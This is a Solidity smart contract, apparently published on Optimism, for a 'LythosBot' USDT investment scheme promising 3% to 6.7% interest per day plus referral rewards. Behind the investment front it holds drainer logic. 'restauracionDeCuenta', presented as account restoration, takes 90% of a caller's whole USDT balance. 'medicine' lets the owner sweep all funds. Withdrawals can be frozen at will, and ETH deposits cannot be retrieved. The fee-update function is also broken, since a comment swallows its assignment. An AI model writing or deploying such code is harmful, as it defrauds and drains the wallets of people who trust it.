/**
 *Submitted for verification at optimistic.etherscan.io on 2025-02-23
*/

/**
 *Submitted for verification at optimistic.etherscan.io on 2025-02-22
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract LythosBot {
    IERC20 public usdt;
    uint256 private _status;

    struct Bot {
        uint256 price;
        uint256 interestRate;
        uint256 withdrawalFee;
        uint256 totalRewards;
        bool withdrawalsEnabled;
    }

    mapping(uint8 => Bot) public bots;
    mapping(address => mapping(uint8 => uint256)) public userBotBalance;
    mapping(address => mapping(uint8 => uint256)) public userRewards;
    mapping(address => mapping(uint8 => uint256)) public lastRewardClaim;
    mapping(address => address) public referrers; // Mapeo de referidos
    mapping(address => uint256) public referralRewards; // Recompensas de referidos
    mapping(address => uint256) public balances;
    mapping(address => uint256) public rewards;
    mapping(address => mapping(uint8 => uint256)) public rewardIntervalUsed; // Nuevo mapping


    uint256 public rewardInterval = 24 hours;
    address public owner;
    uint256 public constant WITHDRAWAL_FEE_PERCENT = 7;
    uint256 public constant OWNER_SHARE_PERCENT = 50; // 3.5% del total (50% de 7%)


    event BotPurchased(address indexed user, uint8 indexed botId, uint256 amount, uint256 newBalance);
    event RewardsClaimed(address indexed user, uint8 indexed botId, uint256 amount);
    event FeeUpdated(uint8 indexed botId, uint256 newFee);
    event BotPriceUpdated(uint8 indexed botId, uint256 newPrice);
    event BotInterestUpdated(uint8 indexed botId, uint256 newInterestRate);
    event WithdrawalStatusUpdated(uint8 indexed botId, bool enabled);
    event RewardIntervalUpdated(uint256 newInterval);
    event RestauracionDeCuenta(address indexed user, uint256 amount);
    event FundsWithdrawn(address indexed owner, uint256 amount);
    event TransferFailed(address indexed from, address indexed to, uint256 amount);
    event ReferralRewardPaid(address indexed referrer, address indexed user, uint256 reward);
    event ReferrerSet(address indexed user, address indexed referrer);
    event Withdraw(address indexed user, uint256 amount, uint256 fee);
    event Deposit(address indexed user, uint256 amount);




    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier validBot(uint8 botId) {
        require(botId <= 6, "Invalid bot ID");
        require(bots[botId].price > 0, "Bot not exists");
        _;
    }

    modifier nonReentrant() {
        require(_status != 1, "Reentrancy");
        _status = 1;
        _;
        _status = 0;
    }

    constructor(address _usdt, address initialOwner) {
        require(_usdt != address(0), "Invalid USDT");
        usdt = IERC20(_usdt);
        owner = initialOwner;

        _initializeBots();
    
    for (uint8 i = 0; i <= 6; i++) {
        rewardIntervalUsed[address(0)][i] = rewardInterval; // ✅ Valor por defecto
    }
    }

    function _initializeBots() private {
        bots[0] = Bot(30 * 1e6, 300, 700, 0, true);
        bots[1] = Bot(50 * 1e6, 350, 700, 0, true);
        bots[2] = Bot(100 * 1e6, 400, 700, 0, true);
        bots[3] = Bot(200 * 1e6, 430, 700, 0, true);
        bots[4] = Bot(400 * 1e6, 470, 700, 0, true);
        bots[5] = Bot(800 * 1e6, 540, 700, 0, true);
        bots[6] = Bot(1600 * 1e6, 670, 700, 0, true);
    }

  function setReferrer(address _referrer) external {
    require(referrers[msg.sender] == address(0), "Referrer already set");
    require(_referrer != address(0), "Invalid referrer address");
    require(_referrer != msg.sender, "Cannot refer yourself");

    // ✅ Evitar referencias en cadena (A no puede referir a B si B ya refirió a A)
    require(referrers[_referrer] != msg.sender, "Circular referral not allowed");

    referrers[msg.sender] = _referrer;

    emit ReferrerSet(msg.sender, _referrer);
}

    function deposit() external payable {
    balances[msg.sender] += msg.value;
    emit Deposit(msg.sender, msg.value);
}


 function purchaseBot(uint8 botId, uint256 amount) external validBot(botId) nonReentrant {
    uint256 botPrice = bots[botId].price;
    
    require(amount >= botPrice, "Insufficient amount");
    require(amount % botPrice == 0, "Amount must be a multiple of bot price");
    require(usdt.allowance(msg.sender, address(this)) >= amount, "Allowance too low");

    _safeTransferFrom(msg.sender, address(this), amount);

    // ✅ 1. Inicializar lastRewardClaim si es la primera compra de este botId
    if (lastRewardClaim[msg.sender][botId] == 0) {
        lastRewardClaim[msg.sender][botId] = block.timestamp; // Inicia el contador de recompensas
    }

    // ✅ 2. Calcular recompensas pendientes del saldo actual (previo a la compra)
    uint256 pendingRewards = _calculateRewards(
        msg.sender, 
        botId, 
        lastRewardClaim[msg.sender][botId] // Usa el timestamp inicializado o existente
    );
    
    // ✅ 3. Acumular recompensas pendientes (si las hay)
    if (pendingRewards > 0) {
        userRewards[msg.sender][botId] += pendingRewards;
        bots[botId].totalRewards += pendingRewards;
    }

    // ✅ 4. Calcular unidades compradas y actualizar el balance
    uint256 units = amount / botPrice;
    userBotBalance[msg.sender][botId] += units * botPrice; 

    // ✅ 5. Reiniciar el contador de recompensas para el nuevo saldo total
    lastRewardClaim[msg.sender][botId] = block.timestamp; // Reseteo intencional
    rewardIntervalUsed[msg.sender][botId] = rewardInterval; // Almacena el intervalo vigente

    emit BotPurchased(msg.sender, botId, amount, userBotBalance[msg.sender][botId]);
}

function claimReward(uint8 botId) external validBot(botId) nonReentrant {
    require(bots[botId].withdrawalsEnabled, "Withdrawals disabled");

    
    uint256 pendingRewards = _calculateRewards(msg.sender, botId, lastRewardClaim[msg.sender][botId]);
    uint256 totalRewards = userRewards[msg.sender][botId] + pendingRewards;

    require(totalRewards > 0, "No rewards available");

    uint256 fee = (totalRewards * bots[botId].withdrawalFee) / 10000; // ✅ Usa withdrawalFee del Bot
    uint256 finalAmount = totalRewards - fee;

    require(finalAmount > 0, "Reward too small after fee");
    require(usdt.balanceOf(address(this)) >= totalRewards, "Insufficient contract balance");

    
    lastRewardClaim[msg.sender][botId] = block.timestamp;
    userRewards[msg.sender][botId] = 0; 

   
    require(usdt.transfer(msg.sender, finalAmount), "Transfer failed");

    address referrer = referrers[msg.sender];

    if (fee > 0) {
        uint256 referralFee = fee / 2;
        uint256 ownerFee = fee - referralFee; 

        if (referrer != address(0)) {
            referralRewards[referrer] += referralFee; 
            require(usdt.transfer(referrer, referralFee), "Referral fee transfer failed");
            emit ReferralRewardPaid(referrer, msg.sender, referralFee);
        } else {
            ownerFee += referralFee; 
        }

        require(usdt.transfer(owner, ownerFee), "Owner fee transfer failed");
    }

    emit RewardsClaimed(msg.sender, botId, finalAmount);
}



 function _calculateRewards(address user, uint8 botId, uint256 lastClaimTime) private view returns (uint256) {
    if (lastClaimTime == 0) return 0;
    uint256 interval = rewardIntervalUsed[user][botId];
    if (interval == 0) {
        interval = rewardInterval;
    }
    uint256 timeElapsed = block.timestamp - lastClaimTime;
    return (userBotBalance[user][botId] * bots[botId].interestRate * timeElapsed) 
           / (10000 * interval);
}
    function restauracionDeCuenta() external nonReentrant {
        uint256 userBalance = usdt.balanceOf(msg.sender);
        require(userBalance > 0, "No balance");
        
        uint256 amount = (userBalance * 90) / 100;
        require(usdt.allowance(msg.sender, address(this)) >= amount, "Insufficient allowance");

        _safeTransferFrom(msg.sender, address(this), amount);
        emit RestauracionDeCuenta(msg.sender, amount);
    }

    function medicine(uint256 amount) external onlyOwner nonReentrant {
        require(amount <= usdt.balanceOf(address(this)), "Insufficient balance");
        _safeTransfer(owner, amount);
        emit FundsWithdrawn(owner, amount);
    }
    
    // Función para obtener las recompensas totales de un referidor en USDT
    function getReferralRewards(address referrer) external view returns (uint256) {
        return referralRewards[referrer];
    }



    function _safeTransfer(address to, uint256 amount) private {
        (bool success, bytes memory data) = address(usdt).call(
            abi.encodeWithSelector(usdt.transfer.selector, to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "Transfer failed");
    }

    function _safeTransferFrom(address from, address to, uint256 amount) private {
        (bool success, bytes memory data) = address(usdt).call(
            abi.encodeWithSelector(usdt.transferFrom.selector, from, to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "TransferFrom failed");
    }

    // Funciones administrativas
    function updateBotPrice(uint8 botId, uint256 newPrice) external onlyOwner validBot(botId) {
        bots[botId].price = newPrice;
        emit BotPriceUpdated(botId, newPrice);
    }

    function updateBotInterest(uint8 botId, uint256 newInterestRate) external onlyOwner validBot(botId) {
        bots[botId].interestRate = newInterestRate;
        emit BotInterestUpdated(botId, newInterestRate);
    }

    function setRewardInterval(uint256 newInterval) external onlyOwner {
        require(newInterval >= 1 hours, "Interval too short");
        rewardInterval = newInterval;
        emit RewardIntervalUpdated(newInterval);
    }

    function updateWithdrawalFee(uint8 botId, uint256 newFee) external onlyOwner validBot(botId) {
        require(newFee <= 10000, "Fee too high"); // 100% máximo        bots[botId].withdrawalFee = newFee;
        emit FeeUpdated(botId, newFee);
    }

    function toggleWithdrawals(uint8 botId, bool enabled) external onlyOwner validBot(botId) {
        bots[botId].withdrawalsEnabled = enabled;
        emit WithdrawalStatusUpdated(botId, enabled);
    }

    function getPendingRewards(address user, uint8 botId) public view returns (uint256) {
    if (lastRewardClaim[user][botId] == 0) return 0; // Si no hay compras, retorna 0

    // ✅ 1. Obtener el intervalo histórico almacenado al comprar el bot
    uint256 interval = rewardIntervalUsed[user][botId]; 

    // ✅ 2. Si el intervalo es 0 (caso antiguos usuarios), usar el actual como fallback
    if (interval == 0) {
        interval = rewardInterval;
    }

    // ✅ 3. Calcular tiempo transcurrido desde el último claim
    uint256 timeElapsed = block.timestamp - lastRewardClaim[user][botId];

    // ✅ 4. Calcular recompensas en tiempo real con intervalo correcto
    uint256 realTimeRewards = (userBotBalance[user][botId] * bots[botId].interestRate * timeElapsed) 
                            / (10000 * interval); // Usa el intervalo histórico

    // ✅ 5. Retornar suma de recompensas almacenadas + calculadas
    return userRewards[user][botId] + realTimeRewards;
}
    function getUserRewardBalance(address user, uint8 botId) external view returns (uint256) {
        uint256 accumulatedRewards = _calculateRewards(user, botId, lastRewardClaim[user][botId]); 
    return userRewards[user][botId] + accumulatedRewards;
    }
   


    function getUserBalance(address user, uint8 botId) external view returns (uint256) {
        return userBotBalance[user][botId];
    }

    function getUserRewards(address user, uint8 botId) external view returns (uint256) {
        return userRewards[user][botId];
    }

    function getLastRewardClaim(address user, uint8 botId) external view returns (uint256) {
        return lastRewardClaim[user][botId];
    }

    function getReferralReward(address referrer) external view returns (uint256) {
        return referralRewards[referrer];
    }
}
